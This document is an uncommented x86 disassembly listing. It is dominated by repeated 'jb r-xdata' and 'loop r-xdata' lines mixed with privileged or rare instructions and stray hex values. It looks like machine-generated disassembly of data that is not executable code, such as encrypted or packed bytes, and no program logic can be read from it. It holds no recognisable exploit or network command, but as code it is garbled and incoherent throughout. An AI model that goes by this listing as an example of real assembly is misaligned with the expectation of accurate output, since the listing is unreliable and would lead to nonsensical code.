sbb eax 0xbc6f721d
jb r-xdata
mov bh 0x69
jb r-xdata
or [ ebx ] bl
sbb eax 0x7272721d
loop r-xdata
jb r-xdata
or ebp [ edi + 0x72e2e2f1 ]
jb r-xdata
sbb eax 0x6f56af6f
imul esp [ edx + ecx * 8 + 0x1d1f090a ] 0x1d
mov dh [ ecx - 0x4aef1484 ]
imul esp [ esi + eax * 8 + 0x1d1f3f0a ] 0x1d
mov ah [ edi - 0x4aadb82e ]
imul esp [ esi + ebp * 8 + 0x1d1f2d0a ] 0x1d
or edx [ edi - 0x39 ]
loop r-xdata
sbb ebx [ edi ]
aam 0xb5
imul esp [ edx + ebx * 2 - 0x1e ] 0xffffffe2
loop r-xdata
sahf
jb r-xdata
sbb al 0x1d
sbb eax 0xa9ea46b
cli
jb r-xdata
imul edi [ edi - 0x1381f436 ] 0xffffffe2
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x84
imul esi [ edi - 0x50947bfc ] 0x12
or ecx [ ebx + 0x72e2e2eb ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
sbb cl [ ebx ]
fsubr st2
loop r-xdata
sbb eax 0x16751dd4
and ah bh
mov [ ebx ] ebp
out 0x58 eax
sbb eax 0x84e2e2f7
imul esi esi 0xffffffd3
imul edx [ esi - 0x59db112e ] 0xffffffd2
and ecx edx
and dh [ edx - 0x4e4d4d4e ]
lodsb [ esi ]
in al dx
loop r-xdata
jb r-xdata
or edx [ eax + 0x1c ]
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
loop r-xdata
jb r-xdata
int1
jb r-xdata
mov cl 0xb4
mov ebp 0x72212bb9
jb r-xdata
jmp r-xdata
shl [ edx ] 0x1
movsb [ edi ] [ esi ]
jb r-xdata
mov ebx 0xbe0b2267
adc edx [ ebx + 0x61b1721d ]
and edx [ edx ]
or ch [ ecx + 0x8 ]
sbb eax 0xd6a1691d
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ ebx + 0x721d1d00 ]
jb r-xdata
or al [ edx ]
jb r-xdata
jb r-xdata
loop r-xdata
in eax dx
jb r-xdata
sbb eax 0x72721d1d
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
loop r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
out dx al
or bh dl
mov ebx 0xba222d1
jb r-xdata
sub eax 0xe2cd1c0b
loop r-xdata
or ah [ edi + 0x1e ]
jb r-xdata
jb r-xdata
jl r-xdata
jb r-xdata
jb r-xdata
outsd
add [ 0x7272721d ] bl
jb r-xdata
hlt
jb r-xdata
sbb eax 0xe2887272
jb r-xdata
or ebx [ ecx + edx * 8 + 0x7272e2e2 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
jb r-xdata
jb r-xdata
jb r-xdata
0x7e0b
jb r-xdata
and al 0xca
imul esp [ edx + ebp * 8 + 0x1d1e310a ] 0x1d
mov bl [ edx ]
sbb eax 0x2267bb1d
in eax dx
xchg esi eax
sbb eax 0x17498a1d
lahf
fidiv [ ecx + 0x1d18ff0b ]
sbb eax 0xa727272
outsd
cmpsd [ esi ] [ edi ]
mov dl 0xb
mov ecx 0x72e2e2d6
mov edx 0x14a76b84
or ebp [ esp + ebp * 8 - 0x1e ]
push ds
mov dl 0x1d
jb r-xdata
sbb eax 0xcf418a1d
add ebp edi
mov ch 0x6b
movsb [ edi ] [ esi ]
0x90a
pop ds
adc [ ebp + 0xac6a46b ] dh
aas
pop ds
sbb eax 0xd2a78a1d
inc edi
or bh [ edx ]
pop ds
test [ ebx - 0x49 ] ch
add al 0x84
imul ebp [ edi - 0x1474f4ee ] 0xffffffe2
xchg ebp eax
test [ ebx - 0x59 ] ch
push es
jbe r-xdata
sbb eax 0xed727272
jb r-xdata
sbb eax 0xb2727272
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
shl edx 0x1
cmpsd [ esi ] [ edi ]
inc esi
or eax [ ebp + 0x1c ]
sbb eax 0x7272721d
in eax dx
sbb eax 0x56af6f1d
outsd
jb r-xdata
jb r-xdata
imul esp [ edx + ecx ] 0x1d1d1f3a
mov ebx 0x66ed2267
jmp r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jne r-xdata
jb r-xdata
jb r-xdata
in eax dx
inc esi
cmp eax 0x22d11d1d
and [ edx + 0x72 ] esi
jb r-xdata
xchg edi eax
jb r-xdata
push edx
mov ch 0x6b
outsd
cmpsb [ esi ] [ edi ]
xor ch ch
push ebp
or ecx [ ecx + 0x721d1d09 ]
jb r-xdata
loop r-xdata
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and ch ch
jb r-xdata
movsb [ edi ] [ esi ]
into
or ch al
sbb al 0x1d
sbb eax 0xc3df028a
sbb eax 0x6b0aea97
add [ 0xbbbbb1d ] ebx
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jno r-xdata
xchg edi eax
sbb eax 0xe2e21675
loop r-xdata
jb r-xdata
jb r-xdata
lahf
adc al 0x84
imul esi [ edi + 0xb8b88be ] 0xffffffa8
test [ ebx - 0x61 ] ch
sbb cl [ eax + 0x1fe30bb4 ]
sbb eax 0x7272721d
jb r-xdata
or ch [ ebx + 0x1 ]
sbb eax 0xbbbbb1d
pop ebp
shl [ edx ] 0x1
or eax [ eax + 0x721d1d1d ]
jb r-xdata
or eax [ ecx + ecx * 8 - 0x1e ]
loop r-xdata
mov dl 0xb2
mov dl 0xb1
jb r-xdata
jb r-xdata
mov edx 0xe2f8900b
loop r-xdata
mov [ ebp + 0x6a76b84 ] dl
jb r-xdata
0x1d016b0a 0xbb1d
jb r-xdata
mov edi 0xec7e0bca
jb r-xdata
cmpsd [ esi ] [ edi ]
push cs
mov dl 0xb
mov esp ebp
loop r-xdata
outsd
loop r-xdata
cmp ebp ebp
fist [ ebx ]
sbb eax 0x1e971d1d
scasb [ edi ]
add ebx [ 0x1d72721d ]
mov esp 0x72212bb9
dec ebp
salc
jb r-xdata
imul edi [ edx ] 0x66ed3967
fist [ ebx ]
scasd [ edi ]
test [ edx ] 0x6
retn 0xe2e2
or al [ esi ]
jb r-xdata
sbb eax 0x9c19ad8a
out dx eax
mov ch 0x6b
add bl [ 0xffffffff9ea46b1d ]
jb r-xdata
sbb [ 0xfffffffffd9267ed ] ebx
loop r-xdata
push es
sbb eax 0xee26611d
imul ebx [ esi + 0xab4f6c6 ] 0xffffff90
mov bl [ 0xffffffffb1e2e2e2 ]
mov ah 0xa
daa
push ds
jb r-xdata
or ch [ 0xb1d1d1f ]
push edi
dec edx
and edx 0xffffffe2
and eax 0x7afac6a6
fsub st2
loop r-xdata
or edi [ esi - 0x14 ]
jb r-xdata
mov cl 0x6f
mov cl 0xb
fstp [ esi ]
sbb eax 0x7272721d
jb r-xdata
and ch ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
adc ebx [ 0xffffffff8ae6881d ]
mov ah 0x82
mov dl 0x71
jb r-xdata
jb r-xdata
jb r-xdata
mov dl ah
sbb eax 0xe2e26274
in al dx
loop r-xdata
bound ebp [ ebx - 0x41 ]
sbb eax 0xe2e21a75
in eax dx
jb r-xdata
jb r-xdata
mov bl cl
loop r-xdata
loop r-xdata
out dx al
jb r-xdata
loop r-xdata
mov ecx [ ebx ]
loop r-xdata
loop r-xdata
mul edx
imul edi [ edi - 0x60947bfc ] 0x14
test [ ebx - 0x49 ] ch
mov esi 0xa80b8b88
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x2267bb1d
in eax dx
jmp r-xdata
and al 0xa
cmp bl [ edi ]
out dx al
sub esp [ ecx ]
jb r-xdata
or edx [ eax + 0x72e2e2c2 ]
jb r-xdata
xor eax 0xa4e2e2d4
jb r-xdata
and ch ch
jb r-xdata
loop r-xdata
jb r-xdata

sbb ah [ edi + 0x1d ]
in eax dx

or ecx [ edi ]
pop ss
sbb eax 0x6469721d
sbb eax 0x88ee2661
loop r-xdata
pop esi
loop r-xdata
movhps [ 0x6469721d ] xmm3
mov eax 0xe2d8d60b
jb r-xdata
jb r-xdata
mov dl 0xb
loop r-xdata
mov ch 0x1d
je r-xdata
adc ebx [ 0x1e971d1d ]
sbb eax 0xe2e26a74
cmpsd [ esi ] [ edi ]
mov dl 0x8a
in al 0xe2
loopne r-xdata
sbb eax 0x990bf2b5
std
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
or edi [ edi - 0x1e ]
or edx [ edi + 0xa721d1d ]
arpl cx di
loop r-xdata
popad
push cs
out dx al
mov cl 0xb5
and ch ch
inc bp
add bl [ 0x2aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
dec edx
or dh [ esi - 0x10 ]
loop r-xdata
pop ax
jb r-xdata
jb r-xdata
or eax esp
jb r-xdata
jb r-xdata
push edx
in al 0xe2
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0xe2e9130b
loop r-xdata
cmpsd [ esi ] [ edi ]
mov cl 0xb2
mov dl 0xa
std
add ebx [ 0xffffffffee26611d ]
loop r-xdata
or esi edx
call 0x6e5189b6
cmp eax 0x72721d1d
jb r-xdata
or ch [ ebx ]
sbb [ 0xdb88a1d ] bl
and ch ch
dec edx
or al [ ebp - 0x10 ]
loop r-xdata
outsd
scasd [ edi ]
cmp ch [ edi - 0x59 ]
and cl [ bp + di ]
test dl bl
loop r-xdata
loop r-xdata
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
adc al 0xd1
and cl [ eax + 0x39f0ba6 ]
sbb eax 0xeb18611d
loop r-xdata
jb r-xdata
shl dl 0x1
jb r-xdata
mov bl [ esi + 0x39 ]
jb r-xdata
adc al 0xed
jb r-xdata
jb r-xdata
push cs
pop ds
sbb eax 0xe38ab21d
loop r-xdata
sbb eax 0xaf69ee97
0xe2e48f0b 0x72e2
leave
jb r-xdata
jb r-xdata
push 0xffcf
adc al 0xed
jb r-xdata
sbb eax 0x1269311d
xchg ebx eax
push ds
or esp ecx
shl dl 0x1
loop r-xdata
mov dl dh
out dx al
jb r-xdata
dec ecx
jb r-xdata
inc ebp
mov bh 0x69
push cs
or edx [ ebx ]
jmp 0xffffffff93638aa2
or ebp [ esi + 0x721d1d03 ]
jb r-xdata
imul ebx [ edx ] 0x66ed1d67

popad
out dx al
or edx [ edx - 0x1c ]
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mov [ esi + 0x1d15d60b ] al
loop r-xdata
mov ch 0x6b
pop esp
loop r-xdata
cmp [ ecx + 0x5f ] ecx
jb r-xdata
test [ ebx - 0x51 ] ch
push ds
in eax dx
jb r-xdata
jg r-xdata
jb r-xdata
salc
loop r-xdata
push ds
jb r-xdata
salc
jb r-xdata

jb r-xdata
jb r-xdata
jb r-xdata
outsd
popad
fild [ edx + 0xbe2e208 ]
push ebx
cmp al 0x1d
sbb eax 0x72727272
out dx al
jb r-xdata
push cs
popad
push cs
mov [ ebx - 0x7b6b7746 ] al
imul esp [ edi - 0x37f445ee ] 0x12
sbb eax 0x8872721d
retn 0xd80b
jl r-xdata
pop edi
jb r-xdata
loop r-xdata
push 0xffffffcf
jb r-xdata
iretd
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
shr [ ebx ] 0x1
test [ ebx - 0x51 ] ch
sbb al 0xbb
imul ebp [ edx ] 0x1eaf6b84
jb r-xdata
sbb eax 0xed1a9fdb
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
push cs
loop r-xdata
jb r-xdata
or eax 0x850b0fbd
loopne r-xdata
mov dh ah
mov ah dl
shl dl cl
loop r-xdata
cmpsd [ esi ] [ edi ]
imul esp [ edx + esi * 4 + 0x1d18610a ] 0x1d
or eax [ eax + 0x5be2e2d7 ]
imul esp [ edi - 0x387745f8 ] 0xffffff84
imul esp [ edi - 0x747745f2 ] 0xffffff84
imul esp [ edi - 0x3d7745f4 ] 0xffffff84
imul esp [ edi - 0x13b6f4ee ] 0xffffffe2
loop r-xdata
jb r-xdata
or dh dl
mov cl 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ si ] [ di ]
lahf
jb r-xdata
jb r-xdata
add bl [ 0x3aaf6f1d ]
outsd
cmpsd [ esi ] [ edi ]
pop eax
xor eax 0xa4e2e2d4
test [ ebx - 0x59 ] ch
push ss
jb r-xdata
jb r-xdata
loop r-xdata
pop esi
jb r-xdata
loop r-xdata
push ds
sbb eax 0xe90bb21d
cmp ecx esi
loop r-xdata
or [ edx + 0x6b84c788 ] bh
cmpsd [ esi ] [ edi ]
push cs
mov edx 0x6b848b88
cmpsd [ esi ] [ edi ]
or al 0xba
mov dl al
test [ ebx - 0x59 ] ch
adc cl [ ebx ]
dec ecx
in al dx
test [ ebx - 0x59 ] ch
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
mov dl 0xa
popad
sbb [ 0xffffffffd7800b1d ] bl
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ esp + ebp * 8 - 0x1e ]
loop r-xdata
imul ebp esi 0xfffffff4
or ebx [ edi + 0x721d1d16 ]
in eax dx
push ss
shl edx 0x1
loop r-xdata
loop r-xdata
sbb eax 0xd6e90bb2
mov cl 0x6f
jb r-xdata
mov ch 0x69
sbb dl cl
cmp [ ebx ] ecx
outsb
jb r-xdata
loop r-xdata
test eax esp
mov ebp 0xe0850b0f
sub ebx [ eax ]
sbb eax 0xdb88a1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ds
jb r-xdata
mov ah 0xb5
imul ebx [ edx ] 0x6e0b39d1
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xbe2e2e2
pop ebx
add ebx [ 0xffffffffee26611d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
movsb [ edi ] [ esi ]
sbb eax 0xc2887272
or ebx eax
mov ebp 0x72727221
jb r-xdata
bound ebx [ bx ]
jb r-xdata
jb r-xdata
imul ecx [ esi ] 0x88f20e61
cmp [ edx + 0x6b849488 ] 0xffffffa7
adc bh [ edx + 0x1d12c80b ]
imul ecx [ esi ] 0xb1ee0e61
mov ch 0xb
sbb eax 0x1a9fdb1d
in eax dx
jb r-xdata
jb r-xdata
int 0xd5
loop r-xdata
jb r-xdata
imul ebp [ edi + 0x1ab76b16 ] 0x69
jb r-xdata
outsd
jb r-xdata
scasd [ edi ]
jb r-xdata
mov eax [ edi - 0x79e558db ]
jb r-xdata
aad 0xe2
mov dl 0x6f
sbb eax 0xbee2661
jb r-xdata
mov [ eax + 0x6b843c69 ] dl
mov edi 0xd2800bb0
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and ebp [ ebx ]
and [ edx + 0x72 ] esi
mov esp 0x72e2e2c1
jb r-xdata
out dx al
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
hlt
test [ ecx - 0x26 ] ah
loop r-xdata
sbb eax 0x740bb21d
in al dx
pop ds
jb r-xdata
loop r-xdata
and ebp ebp
or [ 0xb22d11d ] ebx
mov [ 0x721d1d09 ] eax
jb r-xdata
fistp [ edi - 0x589812e6 ]
jb r-xdata
jb r-xdata
jb r-xdata
or bl [ 0x1d1d ]
mov dl 0xb
jmp 0x73288b13
outsd
push ss
jb r-xdata
loop r-xdata
in eax dx
sbb eax 0xff180b1d
loop r-xdata
sub bl [ edi ]
jb r-xdata
mov ah 0xce
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
jb r-xdata
and eax 0x8e861aa7
jb r-xdata
imul esp [ esi + edx * 8 - 0x1d168ef5 ] 0x727272e2
jb r-xdata
out dx al
jb r-xdata
imul esp [ edi - 0x6e7745fe ] 0xffffff84
imul esp [ edi - 0x20f44600 ] 0xffffffec
jb r-xdata
imul edi [ esp + eax * 4 ] 0xbb0bf6b
jb r-xdata
or bh cl
cli
jb r-xdata
mov ebx 0xe2ff770b
loop r-xdata
jb r-xdata
salc
popad
mov ch 0xa
xchg [ 0xffffffff8e861aa7 ] esp
jb r-xdata
loop r-xdata
imul edx [ edx ] 0xe2d5cd0b
loop r-xdata
sbb eax 0xec740bb2
pop ss
fldenv [ ecx ]
in eax dx
sbb ch ch
mov cl 0xb1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
mov bh 0x1a
jb r-xdata
cmpsd [ esi ] [ edi ]
xor ah ch
loop r-xdata
sbb eax 0x676feab4
pop esi
sbb [ 0xffffffffb41db21d ] bl
shl [ edx ] 0x1
mov [ 0xffffffffe2fa270b ] al
mul edx
loop r-xdata
xchg edi eax
push cs
push ds
sbb ch [ ecx - 0x59 ]
jb r-xdata
jb r-xdata
imul esi [ edi + 0x6b84b802 ] 0xffffffb7
add cl dl
xor [ ebx ] cl
xchg edx eax
cli
loop r-xdata
salc
jb r-xdata
jb r-xdata
mov ch 0xae
or eax eax
add [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
outsd
test [ ebx - 0x49 ] ch
sub ch [ ecx + 0x32 ]
test [ ebx - 0x49 ] ch
mov ch 0x6f
adc dl 0xe2
test [ ebx - 0x41 ] ch
mov al 0xb
mov dl 0x6b
mov edi 0xe3b20b1e
loop r-xdata
or esi [ edi - 0x1 ]
sbb eax 0xceb41db2
jb r-xdata
loop r-xdata
jb r-xdata
inc eax
or al [ ebp + 0x611d1d3c ]
out dx al
ja r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb al [ esi + 0xbcc8e8e ]
add ecx [ edx ]
sbb eax 0xb2b3721d
test [ ebx - 0x49 ] ch
add bh [ eax + 0xb76b84 ]
shl [ eax ] 0x1
or edx [ edx + 0x72e2e2fa ]
jb r-xdata
outsd
jb r-xdata
or esi [ ecx - 0x17 ]
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
0x1f9e676f 0x1d1d
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jmp 0x72b88c03
loop r-xdata
jb r-xdata
jno r-xdata
jb r-xdata
sbb eax 0x13cb66ed
sbb eax 0x8ae6881d
or edx esi
fsub st2
sbb [ eax + 0x1e6c0b80 ] cl
jb r-xdata
nop
or esp [ edi ]
and [ edx + 0x72 ] esi
sbb eax 0x72727272
mov ah dl
loop r-xdata
mov bh 0x10
mov eax 0x6b848e88
outsd
sub dx di
loop r-xdata
jb r-xdata
popad
test [ es : ebx ] 0x2b
aad 0xe2
loop r-xdata
mov dl dh
outsd
cmpsd [ esi ] [ edi ]
push es
mov cl 0xb
pop ecx
jmp r-xdata
mov dl 0xa
test [ ebx - 0x11d99ee3 ] edi
loop r-xdata
jb r-xdata
jmp edx
loop r-xdata
jb r-xdata
imul esp [ edi + 0x16a725ea ] 0x878b8091
jb r-xdata
jb r-xdata
bound ebx [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi + 0x1aa76906 ] 0x6b
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
sbb eax 0x72212b1d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esi [ edx ] 0x28b76b84
mov [ esi + 0x2ab76b84 ] cl
mov edi 0x6366ed1e
mov ch 0xb
daa
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
0x9116a725 0x8b80
sahf
pop ds
sbb eax 0x530bb21d
iretd
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
push es
jb r-xdata
outsd
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0xa
jb r-xdata
sub esp [ ecx ]
jb r-xdata
sbb eax 0x4b0b1697
jb r-xdata
mov ah 0xb2
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
loop r-xdata
loop r-xdata
jb r-xdata
imul esp [ edi + 0xaa76b1a ] 0xb16a769
jb r-xdata
loop r-xdata
cmp al 0x84
imul edi [ edi - 0x2d7ff450 ] 0xffffffe2
jb r-xdata
or ch [ ecx - 0x59 ]
cmpsd [ esi ] [ edi ]
jb r-xdata
out dx al
loop r-xdata
jb r-xdata
cmp ebx [ 0x7272721d ]
jb r-xdata
fstp [ esi ]
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
mov ah 0xb2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
push ss
jb r-xdata
loop r-xdata
mov ch 0x1d
jb r-xdata
sbb eax 0xa340b1d
jb r-xdata
jb r-xdata
stc
or [ ebx + 0x1aa72587 ] 0x86
in eax dx
xchg ecx eax
loop r-xdata
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
xchg edi eax
imul edi [ edi - 0x1c4df4e2 ] 0xffffffe2
loop r-xdata
call 0x7262c6dd
imul esp [ edi + 0x16a7690a ] 0xb
jb r-xdata
jb r-xdata
or bl ah
jb r-xdata
sbb eax 0x72727272
jb r-xdata
outsd
sbb eax 0xa340b1d
jb r-xdata
or bl bl
jb r-xdata
0xbc16b8a 0xf9e2
jb r-xdata
push cs
dec ebx
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
sbb eax 0x1d0a340b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ ebx - 0x3 ]
loop r-xdata
or bl [ 0xffffffffb2b3721d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
fadd st6
jb r-xdata
jb r-xdata
inc ebp
stc
or esi [ edx + ecx ]
or al [ esi + edi + 0x1d ]
sbb eax 0xb1ee2661
mov al ah
imul eax ecx 0xb
jb r-xdata
mov ah dh
jecxz r-xdata
pop edx
or esi [ ecx - 0x3f ]
dec esi
call 0x72b88dde
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
sbb eax 0x3a69eeb5
popad
sbb [ 0x15bb67ed ] ebx
sbb eax 0xb22d11d
inc esp
sbb eax 0xee26611d
mov cl 0x88
loopne r-xdata
mov eax 0x1d3e310b
imul esi [ edi - 0x717747f0 ] 0xffffff84
imul esi [ edi - 0x7bcd96d6 ] 0x6b
mov bh 0x28
mov edi 0x16af6b1e
imul esp [ edi + 0xee80b16 ] 0x72721d1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esp [ 0x721d1d1f ]
push ss
cmpsd [ esi ] [ edi ]
jb r-xdata
imul edi [ edi + 0x16af6b1e ] 0x6b
loop r-xdata
jb r-xdata
cmp eax 0x86611d1d
popad
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
or esp edx
jb r-xdata
rcl eax 0x1
loop r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
or bl [ ebx ]
shl edx cl
loop r-xdata
cmpsd [ esi ] [ edi ]
0xe06a0e63 0xe2e2
mov esi 0x72e2e2f6
jb r-xdata
mov ch 0xee
imul edi [ edx ] 0xed1d1961
mov ebx 0xd11d1d15
and cl [ ebx ]
into
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebp eax
jb r-xdata
cmp [ 0x7272721d ] ebx
xchg dh al
jb r-xdata
jb r-xdata
push ds
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov bh 0x69
push cs
imul esp [ edi + 0x6a0e63ea ] 0xbe2e2e0
or dl [ eax ]
sbb eax 0x7272721d
jb r-xdata
mov cl 0x88
jb r-xdata
stc
jb r-xdata
and eax 0x721d1d1f
jb r-xdata
jb r-xdata
inc edx
pop ds
jb r-xdata
sbb eax 0x1db5b2b4
arpl bp ax
jb r-xdata
jb r-xdata
sub bl [ bx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
sbb eax 0x7272721d
in eax dx
mov [ edx + 0x14af6b84 ] bl
jb r-xdata
jb r-xdata
mov dh 0xe2
jb r-xdata
sbb [ 0x6bb4bb1d ] ebx
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
sar [ edx ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and dh [ ebp + esi * 4 + 0x6b1ea76b ]
jb r-xdata
sbb eax 0x1d0ba291
jb r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
loop r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
pop ds
sbb eax 0xab50e97
in ax 0xe2
loop r-xdata
arpl bp ax
sbb eax 0xe2e20674
jb r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
test [ ebx - 0x51 ] ch
jb r-xdata
or eax ecx
jb r-xdata
loop r-xdata
sbb eax 0xa66bb4bb
or edi [ esi + 0x721d1d01 ]
cmpsb [ esi ] [ edi ]
sbb eax 0x6bb4bb1d
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xa725721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb ah bl
push ds
imul esp [ edi + 0x1aa76b16 ] 0xb
jb r-xdata
jge r-xdata
mov ah 0xb5
imul esp [ edi + 0x16a76b1e ] 0x6b
jb r-xdata
mov [ 0xffffffffe2fb1d0b ] al
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x1db1b21d
imul ebp [ edi + 0x6b84bb1a ] 0xffffffaf
jb r-xdata
cmpsd [ esi ] [ edi ]
loop r-xdata
loop r-xdata
jb r-xdata
or eax [ eax + 0x72e2e2d2 ]
jb r-xdata
jb r-xdata
or edx [ eax ]
call 0x72b88c4c
imul esp [ edi - 0xc81f4ea ] 0x7272e2e2
jb r-xdata
mov dl 0x88
jecxz r-xdata
jb r-xdata
adc al 0x69
sub cl [ ebx ]
hlt
scasd [ edi ]
jb r-xdata
cmp bl [ 0xffffffffa725721d ]
jb r-xdata
jb r-xdata
imul esi [ edx ] 0xe2f73e0b
loop r-xdata
mul edx
jb r-xdata
mov esi 0x721d1d01
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
pop ds
outsd
cmpsd [ esi ] [ edi ]
xor dh [ edx + esi * 4 + 0x1d3edb0a ]
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
jb r-xdata
sub bl [ edi ]
sbb eax 0x4e676f1d
adc al 0x1d
sbb eax 0xe2f8960a
loop r-xdata
test [ ebx - 0x61 ] ch
outsd
jb r-xdata
sbb eax 0x72e2e2fb
jb r-xdata
xchg ecx eax
jb r-xdata
jb r-xdata
or ecx [ esi - 0x18 ]
sub [ eax + 0x1d3e310b ] bh
loop r-xdata
out 0x6f al
cmpsd [ esi ] [ edi ]
sub dh [ edx - 0x1d1379f5 ]
loop r-xdata
mov cl 0xb1
jb r-xdata
jb r-xdata
jb r-xdata
fdivr st7
loop r-xdata
xchg esi eax
xor al 0xe3
imul ebp [ edx ] 0x1d1ff40b
sbb eax 0x72727272
jb r-xdata
sbb eax 0x1ea72572
jb r-xdata
or ah dl
sbb eax 0x751db21d
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
sbb eax 0x69727272
jb r-xdata
jb r-xdata
sbb eax 0x6f6fb21d
push esi
sbb bl [ 0x3b9c0a1d ]
movsw [ edi ] [ esi ]
salc
loop r-xdata
or eax [ ebx + ecx + 0x66ed1d1d ]
and edi [ 0xffffffff86611d1d ]
sub cl [ ebx ]
aam 0xce
loop r-xdata
popad
imul esp [ edi + 0x1f7d0b1a ] 0x1d
sbb eax 0x72727272
jb r-xdata
jb r-xdata
pop ds
jb r-xdata
loop r-xdata
imul ebx [ edi + 0xb1c6912 ] 0x7d
cli
loop r-xdata
jb r-xdata
or ebx [ 0x72e2e2fb ]
jb r-xdata
mov edi 0x72727221
jb r-xdata
and al 0xa7
push cs
or edx ecx
jb r-xdata
jb r-xdata
and ebp ebp
jb r-xdata
jb r-xdata
or ecx [ ecx - 0x3c ]
scasd [ edi ]
push ss
mov ebx 0x6b849a88
jb r-xdata
or esi esp
jb r-xdata
and eax 0xe2e31ea7
mov dl 0x1d
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xab76f72
jb r-xdata
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
sbb cl [ ebx ]
mov ch dl
or dl [ esi + 0x69e2e2f8 ]
jb r-xdata
sti
jb r-xdata
0xb16971d 0xe4b
jb r-xdata
shl edx 0xe2
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
out 0xc6 al
jb r-xdata
mov dl 0x6f
jb r-xdata
jb r-xdata
mov al al
jb r-xdata
outsd
jb r-xdata
pop ds
sbb eax 0x7272721d
mov ebx 0x66ed2267
xchg al bh
loop r-xdata
mov edx 0x9c0bc788
loop r-xdata
jne r-xdata
jb r-xdata
push ds
dec ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e20274
jb r-xdata
popfd
cmp [ 0xe120b1d ] bl
or bl [ edi + 0x18 ]
outsd
jb r-xdata
arpl [ esi ] cx
sbb eax 0x1a61bb1d
